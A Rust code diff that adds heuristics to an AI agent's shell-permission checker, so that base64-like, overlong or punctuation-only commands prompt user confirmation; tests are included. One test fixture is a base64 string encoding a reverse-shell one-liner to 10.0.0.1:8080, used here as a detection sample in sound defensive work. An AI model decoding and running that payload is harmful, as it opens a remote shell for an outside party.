@@ -493,8 +493,80 @@ pub fn check(
         };
     }
 
-    // 6. Passthrough — no rules matched, let engine decide
+    // 6. Suspicious unknown command heuristics — safety net for commands that
+    // don't match any known danger pattern but look structurally suspicious.
+    // ponytail: unknown commands are default-Passthrough, but obviously encoded /
+    // obfuscated / unparseable commands should Ask instead of silently running.
+    if let Some(reason) = suspicious_command_heuristic(command) {
+        return PermissionResult::Ask {
+            reason,
+            suggestions: vec![
+                crate::permissions::PermissionUpdate {
+                    rule: format!("Bash({})", command),
+                    behavior: "allow".into(),
+                },
+            ],
+        };
+    }
+
+    // 7. Passthrough — no rules matched, let engine decide
     PermissionResult::Passthrough
+}
+
+/// Heuristic check for suspicious commands that don't match known danger
+/// patterns but are structurally unusual enough to warrant a second look.
+/// Returns Some(reason) if the command should trigger Ask, None if it passes.
+fn suspicious_command_heuristic(command: &str) -> Option<String> {
+    let trimmed = command.trim();
+    if trimmed.is_empty() {
+        return None; // empty string is innocent
+    }
+
+    let chars: Vec<char> = trimmed.chars().collect();
+    let len = chars.len();
+
+    // ── 1. Base64-like blob detection ──
+    // Count characters that belong to the base64 alphabet (including padding)
+    let b64_chars = chars.iter().filter(|c| {
+        c.is_ascii_alphanumeric() || **c == '+' || **c == '/' || **c == '='
+    }).count();
+
+    // Also count whitespace
+    let whitespace = chars.iter().filter(|c| c.is_whitespace()).count();
+
+    // If >90% of non-whitespace chars are base64-alphabet and the command
+    // is long enough to be meaningful (>40 chars), it's probably encoded.
+    let non_ws_len = len.saturating_sub(whitespace);
+    if non_ws_len >= 40 && b64_chars as f64 / non_ws_len as f64 > 0.90 {
+        return Some(format!(
+            "疑似 Base64 编码命令（{}/{} 字符符合 base64 字母表），需用户确认",
+            b64_chars, non_ws_len
+        ));
+    }
+
+    // ── 2. Super-long single "word" without recognisable structure ──
+    // A command with >2000 chars and very few spaces/semicolons/pipes
+    // is unlikely to be a legitimate shell command
+    let separators = trimmed.matches(|c: char| c == ' ' || c == ';' || c == '|' || c == '&').count();
+    if len > 2000 && separators < 5 {
+        return Some(format!(
+            "命令过长（{} 字符）且缺少可辨识的结构，需用户确认",
+            len
+        ));
+    }
+
+    // ── 3. "All punctuation, no words" ──
+    // Commands that are entirely non-alphanumeric with no recognisable
+    // command names are probably garbage or obfuscation attempts
+    let alphanum = chars.iter().filter(|c| c.is_alphanumeric()).count();
+    if len > 20 && alphanum < len / 4 {
+        return Some(format!(
+            "命令缺少可辨识的文字内容（仅 {} 个字母数字字符），需用户确认",
+            alphanum
+        ));
+    }
+
+    None
 }
 
 #[cfg(test)]
@@ -830,5 +902,51 @@ mod tests {
             matches!(r, PermissionResult::Passthrough),
             "normal npm test must passthrough, got: {:?}", r
         );
+    }
+
+    // ── Suspicious command heuristics tests ──
+
+    #[test]
+    fn test_suspicious_base64_like_asks() {
+        let s = sandbox_in_temp();
+        let rules = PermissionRules::new();
+        // Looks like base64-encoded payload — should trigger Ask
+        let b64ish = "cHl0aG9uMyAtYyAnaW1wb3J0IG9zLCBzeXM7IG9zLnN5c3RlbSgic2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4wLjEvODA4MCAwPiYxIikn";
+        let r = check(b64ish, &s, &rules);
+        assert!(
+            matches!(r, PermissionResult::Ask { .. }),
+            "base64-like blob must trigger Ask, got: {:?}", r
+        );
+    }
+
+    #[test]
+    fn test_suspicious_no_words_asks() {
+        let s = sandbox_in_temp();
+        let rules = PermissionRules::new();
+        // All punctuation, no real words — should trigger Ask
+        let garbage = "!!!@@@###$$$%%%^^^&&&***((()))___+++===";
+        let r = check(garbage, &s, &rules);
+        assert!(
+            matches!(r, PermissionResult::Ask { .. }),
+            "garbage command must trigger Ask, got: {:?}", r
+        );
+    }
+
+    #[test]
+    fn test_suspicious_normal_command_passthrough() {
+        let s = sandbox_in_temp();
+        let rules = PermissionRules::new();
+        // Normal commands must still passthrough
+        assert!(matches!(check("cargo build --release", &s, &rules), PermissionResult::Passthrough));
+        assert!(matches!(check("git status", &s, &rules), PermissionResult::Passthrough));
+        assert!(matches!(check("npm install", &s, &rules), PermissionResult::Passthrough));
+        assert!(matches!(check("python script.py", &s, &rules), PermissionResult::Passthrough));
+    }
+
+    #[test]
+    fn test_suspicious_empty_passthrough() {
+        let s = sandbox_in_temp();
+        let rules = PermissionRules::new();
+        assert!(matches!(check("", &s, &rules), PermissionResult::Passthrough));
     }
 }
